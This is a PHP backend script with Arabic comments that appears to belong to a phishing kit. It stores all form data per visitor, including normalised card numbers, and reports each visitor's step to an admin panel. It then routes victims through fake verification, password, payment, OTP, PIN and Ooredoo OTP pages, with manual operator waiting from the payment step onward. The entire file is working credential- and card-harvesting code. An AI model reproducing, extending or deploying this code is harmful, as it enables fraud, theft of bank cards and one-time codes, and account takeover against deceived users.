<?php
error_reporting(0);
ini_set('display_errors', 0);
require_once 'includes/db.php';
require_once 'includes/functions.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $visitor_id = $_POST['visitor_id'] ?? '';
    if (empty($visitor_id)) {
        $visitor_id = "visitor_" . bin2hex(random_bytes(4));
    }

    $current_page = $_POST['current_page'] ?? 'index.php';
    
    // تحديث خطوة الزائر وحالته لضمان ظهوره في لوحة الأدمن
    try {
        $step = str_replace('.php', '', $current_page);
        if ($step === 'index') $step = 'start';
        
        // إجبار الحالة على 'waiting' لضمان الظهور في لوحة الأدمن كطلب جديد أو محدث
        updateVisitorStep($visitor_id, $step);
    } catch (Exception $e) {
        error_log("Error updating visitor step: " . $e->getMessage());
    }

    // حفظ كل البيانات المجمعة من الفورم
    foreach ($_POST as $key => $value) {
        if ($key !== 'visitor_id' && $key !== 'current_page') {
            // تنظيف رقم البطاقة من المسافات لضمان حفظه بشكل صحيح في قاعدة البيانات
            if ($key === 'card_number') {
                $value = str_replace(' ', '', $value);
            }
            saveData($visitor_id, $key, $value);
        }
    }

    // تحديد الصفحة التالية والمنطق
    $next_step = 'success.php';
    $redirects = [
        'index.php' => 'update_info.php',
        'update_info.php' => 'identity_verification.php',
        'identity_verification.php' => 'personal_info.php',
        'personal_info.php' => 'password.php',
        'password.php' => 'payment.php'
    ];

    if (isset($redirects[$current_page])) {
        $next_step = $redirects[$current_page];
        // انتقال تلقائي بعد ثانيتين لجميع الصفحات قبل الدفع
        header("Location: loading.php?visitor_id=$visitor_id&next=$next_step&prev=$current_page");
    } else {
        // منطق الانتظار اليدوي يبدأ من صفحة الدفع وما بعدها
        if (strpos($current_page, 'payment.php') !== false) $next_step = 'otp.php';
        elseif (strpos($current_page, 'otp.php') !== false) $next_step = 'pin.php';
        elseif (strpos($current_page, 'pin.php') !== false) $next_step = 'ooredoo.php';
        elseif (strpos($current_page, 'ooredoo.php') !== false) $next_step = 'otp_ooredoo.php';
        
        header("Location: loading.php?visitor_id=$visitor_id&next=$next_step&prev=$current_page");
    }
    exit;
}
?>
